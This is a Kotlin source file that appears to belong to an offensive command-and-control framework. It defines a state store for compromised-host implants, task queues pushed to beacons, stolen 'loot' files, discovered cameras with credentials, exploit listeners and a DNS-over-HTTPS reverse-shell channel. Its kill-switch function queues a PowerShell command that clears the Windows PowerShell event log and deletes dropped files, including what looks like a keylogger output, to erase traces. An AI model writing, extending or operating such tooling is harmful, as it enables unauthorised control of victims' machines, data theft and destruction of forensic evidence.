package com.projectzerodays.quantumcli.c2

import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedReader
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.ConcurrentHashMap

/** Live implant record (Turbine parity). */
data class ImplantInfo(
    val host: String,
    val firstSeen: String,
    val lastSeen: String,
    val beacons: Int,
    val os: String? = null,
)

/** One structured audit line ({ts, tag, msg} — audit.jsonl parity). */
data class AuditEvent(val ts: String, val tag: String, val msg: String)

/** One overlord/QBrain decision ({ts, action, target, reason} — decisions.jsonl parity). */
data class Decision(val ts: String, val action: String, val target: String, val reason: String)

/** Camera discovery hit. */
data class CameraHit(
    val ip: String,
    val vendor: String,
    val ports: List<Int>,
    val source: String,
    val creds: String? = null,
    val model: String? = null,
)

/** Sealed loot entry (GRAYFISH .gfy at rest). */
data class LootEntry(
    val host: String,
    val fileName: String,
    val sealedPath: String,
    val bytes: Int,
    val ts: String,
    val kind: String,
)

/**
 * C2State — singleton repository backing the whole C2: implant registry,
 * TASKQ, KILLSWITCH flag, audit ring buffer, decisions list, cameras, loot.
 * Mirrors the Python script's globals (TURBINE.implants, TASKQ, KILLSWITCH,
 * logs/audit.jsonl, logs/decisions.jsonl) with Compose-friendly flows.
 */
object C2State {

    const val VERSION = "3.1.0"
    private const val AUDIT_RING = 2000
    private const val DECISION_RING = 200

    @Volatile
    private var initialized = false

    lateinit var filesRoot: File
        private set
    val logDir: File get() = File(filesRoot, "logs")
    val lootDir: File get() = File(filesRoot, "loot")
    val qcliDir: File get() = File(filesRoot, "qcli")

    private val lock = Any()

    // ---- TASKQ: per-implant pending task (popped on beacon pull) ----
    private val taskq = ConcurrentHashMap<String, JSONObject>()

    // ---- Live UI state ----
    private val _implants = MutableStateFlow<Map<String, ImplantInfo>>(emptyMap())
    val implants: StateFlow<Map<String, ImplantInfo>> = _implants.asStateFlow()

    private val _tasks = MutableStateFlow<Map<String, JSONObject>>(emptyMap())
    val tasks: StateFlow<Map<String, JSONObject>> = _tasks.asStateFlow()

    private val _killswitch = MutableStateFlow(false)
    val killswitch: StateFlow<Boolean> = _killswitch.asStateFlow()

    private val _audit = MutableStateFlow<List<AuditEvent>>(emptyList())
    val audit: StateFlow<List<AuditEvent>> = _audit.asStateFlow()

    private val _decisions = MutableStateFlow<List<Decision>>(emptyList())
    val decisions: StateFlow<List<Decision>> = _decisions.asStateFlow()

    private val _cameras = MutableStateFlow<List<CameraHit>>(emptyList())
    val cameras: StateFlow<List<CameraHit>> = _cameras.asStateFlow()

    private val _loot = MutableStateFlow<List<LootEntry>>(emptyList())
    val loot: StateFlow<List<LootEntry>> = _loot.asStateFlow()

    // ---- Unique listener deployment ----
    private val _listeners = MutableStateFlow<List<ListenerInfo>>(emptyList())
    val listeners: StateFlow<List<ListenerInfo>> = _listeners.asStateFlow()

    data class ListenerInfo(
        val port: Int,
        val name: String,
        val target: String,
        val exploitType: String,
        val running: Boolean,
        val hits: Int,
        val createdAt: String
    )

    fun deployListener(name: String, target: String, exploitType: String, port: Int? = null): ListenerInfo {
        val assignedPort = port ?: findFreePort()
        val info = ListenerInfo(assignedPort, name, target, exploitType, true, 0, now())
        _listeners.value = _listeners.value + info
        audit("C2", "Listener '$name' deployed on :$assignedPort (target: $target, exploit: $exploitType)")
        return info
    }

    fun stopListener(port: Int): Boolean {
        val current = _listeners.value
        val listener = current.find { it.port == port } ?: return false
        _listeners.value = current - listener
        audit("C2", "Listener '${listener.name}' on :$port stopped")
        return true
    }

    fun stopAllListeners() {
        val count = _listeners.value.size
        _listeners.value = emptyList()
        audit("C2", "All listeners stopped ($count)")
    }

    fun recordListenerHit(port: Int) {
        _listeners.value = _listeners.value.map {
            if (it.port == port) it.copy(hits = it.hits + 1) else it
        }
    }

    private fun findFreePort(): Int {
        var port = 9100
        while (port < 9999) {
            if (_listeners.value.none { it.port == port }) return port
            port++
        }
        throw IllegalStateException("No available ports in range 9100-9999")
    }

    fun init(root: File) {
        synchronized(lock) {
            if (initialized) return
            initialized = true
            filesRoot = root
            logDir.mkdirs()
            lootDir.mkdirs()
            qcliDir.mkdirs()
            loadAuditTail()
            loadDecisionsTail()
            scanLoot()
        }
    }

    private fun now(): String =
        SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date())

    private fun loadAuditTail() {
        val f = File(logDir, "audit.jsonl")
        if (!f.isFile) return
        val events = ArrayList<AuditEvent>()
        f.bufferedReader().use { r: BufferedReader ->
            var line = r.readLine()
            while (line != null) {
                parseAuditLine(line)?.let { events.add(it) }
                line = r.readLine()
            }
        }
        if (events.size > AUDIT_RING) events.subList(events.size - AUDIT_RING, events.size)
        _audit.value = events
    }

    private fun parseAuditLine(line: String): AuditEvent? = try {
        val o = JSONObject(line)
        AuditEvent(o.optString("ts"), o.optString("tag"), o.optString("msg"))
    } catch (e: Exception) {
        null
    }

    private fun loadDecisionsTail() {
        val f = File(logDir, "decisions.jsonl")
        if (!f.isFile) return
        val out = ArrayList<Decision>()
        f.bufferedReader().use { r: BufferedReader ->
            var line = r.readLine()
            while (line != null) {
                try {
                    val o = JSONObject(line)
                    out.add(
                        Decision(
                            o.optString("ts"), o.optString("action"),
                            o.optString("target"), o.optString("reason")
                        )
                    )
                } catch (e: Exception) {
                    // skip malformed line
                }
                line = r.readLine()
            }
        }
        if (out.size > DECISION_RING) out.subList(out.size - DECISION_RING, out.size)
        _decisions.value = out
    }

    // ------------------------------------------------------------------ audit
    fun audit(tag: String, msg: String) {
        val ev = AuditEvent(now(), tag, msg)
        synchronized(lock) {
            appendLine(File(logDir, "audit.jsonl"), JSONObject().apply {
                put("ts", ev.ts); put("tag", ev.tag); put("msg", ev.msg)
            }.toString())
            _audit.value = (_audit.value + ev).takeLast(AUDIT_RING)
        }
    }

    /** UI-only console clear; audit.jsonl on disk keeps its full history. */
    fun clearAuditUi() {
        synchronized(lock) { _audit.value = emptyList() }
    }

    fun recordDecision(action: String, target: String, reason: String): Decision {
        val d = Decision(now(), action, target, reason)
        synchronized(lock) {
            appendLine(File(logDir, "decisions.jsonl"), JSONObject().apply {
                put("ts", d.ts); put("action", d.action)
                put("target", d.target); put("reason", d.reason)
            }.toString())
            _decisions.value = (_decisions.value + d).takeLast(DECISION_RING)
        }
        return d
    }

    private fun appendLine(f: File, line: String) {
        try {
            f.appendText(line + "\n")
        } catch (e: Exception) {
            // best-effort persistence; live ring still updates
        }
    }

    // ------------------------------------------------------------------ implants
    fun enroll(host: String, os: String? = null) {
        if (host.isBlank()) return
        synchronized(lock) {
            val cur = _implants.value[host]
            val ts = now()
            val updated = if (cur != null) {
                cur.copy(lastSeen = ts, beacons = cur.beacons + 1, os = os ?: cur.os)
            } else {
                ImplantInfo(host = host, firstSeen = ts, lastSeen = ts, beacons = 1, os = os)
            }
            _implants.value = _implants.value + (host to updated)
        }
    }

    // ------------------------------------------------------------------ TASKQ
    fun setTask(host: String, task: JSONObject) {
        taskq[host] = task
        publishTasks()
    }

    fun setTaskAll(task: (String) -> JSONObject) {
        val hosts = taskq.keys.toSet() + _implants.value.keys
        for (h in hosts) taskq[h] = task(h)
        publishTasks()
    }

    fun pullTask(host: String): JSONObject? {
        val t = taskq.remove(host)
        publishTasks()
        return t
    }

    fun peekTasks(): Map<String, JSONObject> = taskq.toMap()

    private fun publishTasks() {
        _tasks.value = taskq.toMap()
    }

    // ------------------------------------------------------------------ kill-switch
    /** KillAll parity: set wipe/die task on every known implant; arm the flag. */
    fun killAll(wipeFirst: Boolean = true): List<String> {
        val hosts = taskq.keys.toSet() + _implants.value.keys
        for (h in hosts) {
            if (wipeFirst) {
                taskq[h] = JSONObject().put("act", "run").put(
                    "cmd",
                    "powershell -NoProfile -Command \"wevtutil cl 'Windows PowerShell';" +
                        " Remove-Item ${'$'}env:TEMP\\a.bat,${'$'}env:TEMP\\kl.klq -ErrorAction SilentlyContinue\""
                )
            } else {
                taskq[h] = JSONObject().put("act", "none")
            }
        }
        publishTasks()
        _killswitch.value = true
        audit("OPSEC", "KILLSWITCH engaged: ${hosts.size} implant task queues set to wipe/die")
        return hosts.toList()
    }

    fun disarmKillswitch() {
        _killswitch.value = false
        audit("OPSEC", "KILLSWITCH disarmed")
    }

    // ------------------------------------------------------------------ cameras / loot
    fun addCamera(hit: CameraHit) {
        synchronized(lock) {
            _cameras.value = (_cameras.value.filter { it.ip != hit.ip } + hit)
        }
    }

    fun setCameras(hits: List<CameraHit>) {
        synchronized(lock) { _cameras.value = hits }
    }

    fun recordLoot(host: String, sealedFile: File, kind: String, bytes: Int): LootEntry {
        val entry = LootEntry(
            host = host,
            fileName = sealedFile.name,
            sealedPath = sealedFile.absolutePath,
            bytes = bytes,
            ts = now(),
            kind = kind,
        )
        synchronized(lock) { _loot.value = _loot.value + entry }
        return entry
    }

    fun scanLoot() {
        val out = ArrayList<LootEntry>()
        val root = lootDir
        if (root.isDirectory) {
            root.listFiles()?.filter { it.isDirectory }?.forEach { hostDir ->
                hostDir.listFiles()?.filter { it.name.endsWith(".gfy") }?.forEach {
                    out.add(
                        LootEntry(
                            host = hostDir.name,
                            fileName = it.name,
                            sealedPath = it.absolutePath,
                            bytes = it.length().toInt(),
                            ts = SimpleDateFormat(
                                "yyyy-MM-dd'T'HH:mm:ss",
                                Locale.US
                            ).format(Date(it.lastModified())),
                            kind = if (it.name.startsWith("posix_drop")) "posix-drop" else "drop",
                        )
                    )
                }
            }
        }
        _loot.value = out.sortedByDescending { it.ts }
    }

    // ------------------------------------------------------------------ dash state
    /** GET /dash/api/state — {decisions, audit, mitre, killswitch} parity. */
    fun dashState(): JSONObject {
        val decisions = JSONArray()
        _decisions.value.takeLast(100).forEach {
            decisions.put(
                JSONObject().put("ts", it.ts).put("action", it.action)
                    .put("target", it.target).put("reason", it.reason)
            )
        }
        val auditArr = JSONArray()
        _audit.value.takeLast(200).forEach {
            auditArr.put(
                JSONObject().put("ts", it.ts).put("tag", it.tag).put("msg", it.msg)
            )
        }
        return JSONObject()
            .put("decisions", decisions)
            .put("audit", auditArr)
            .put("mitre", JSONArray(MitreMapper.coverage(_audit.value)))
            .put("killswitch", _killswitch.value)
            .put("implants", JSONObject(_implants.value.mapValues {
                JSONObject().put("last_seen", it.value.lastSeen).put("beacons", it.value.beacons)
            }))
            .put("version", VERSION)
    }

    // ------------------------------------------------------------------ DoH shell
    private val dohTasks = ConcurrentHashMap<String, JSONObject>()
    private val dohSeen = ConcurrentHashMap<String, Long>()

    /** GET /api/dohshell/targets — active DoH reverse-shell targets with pending tasks. */
    fun dohShellTargets(): JSONObject {
        val arr = JSONArray()
        val now = System.currentTimeMillis()
        dohSeen.forEach { (id, ts) ->
            arr.put(
                JSONObject()
                    .put("id", id)
                    .put("last_seen", SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date(ts)))
                    .put("pending_task", dohTasks.containsKey(id))
            )
        }
        return JSONObject().put("targets", arr).put("count", arr.length())
    }

    /** POST /api/dohshell/task — push a shell/exec/kill task to a DoH target. */
    fun pushDohTask(d: JSONObject): JSONObject {
        val id = d.optString("id")
        if (id.isBlank()) return JSONObject().put("error", "id required")
        val act = d.optString("act", "shell")
        dohTasks[id] = JSONObject().put("act", act).put("cmd", d.optString("cmd", ""))
        dohSeen[id] = System.currentTimeMillis()
        audit("C2", "doh task queued for $id: $act")
        return JSONObject().put("ok", true).put("id", id).put("act", act)
    }

    /** Internal: a DoH beacon arrived — mark alive, return and clear pending task. */
    fun dohBeacon(id: String): JSONObject? {
        dohSeen[id] = System.currentTimeMillis()
        return dohTasks.remove(id)
    }
}
